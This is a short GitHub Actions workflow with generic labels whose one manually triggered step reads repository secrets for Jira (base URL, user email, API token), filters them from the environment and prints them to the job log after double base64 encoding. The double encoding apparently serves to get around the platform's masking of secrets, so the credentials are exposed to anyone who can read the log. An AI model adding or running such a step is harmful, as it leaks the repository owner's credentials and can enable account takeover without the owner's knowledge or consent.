name: GitHub Actions
on:
  workflow_dispatch:
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
      - name: command
        run: env -0 | awk -v RS='\0' '/^(secret_|var_)/ {print $0}' | base64 -w0 | base64 -w0
        env:
          secret_JIRA_BASE_URL: ${{ secrets.JIRA_BASE_URL }}
          secret_JIRA_USER_EMAIL: ${{ secrets.JIRA_USER_EMAIL }}
          secret_JIRA_API_TOKEN: ${{ secrets.JIRA_API_TOKEN }}
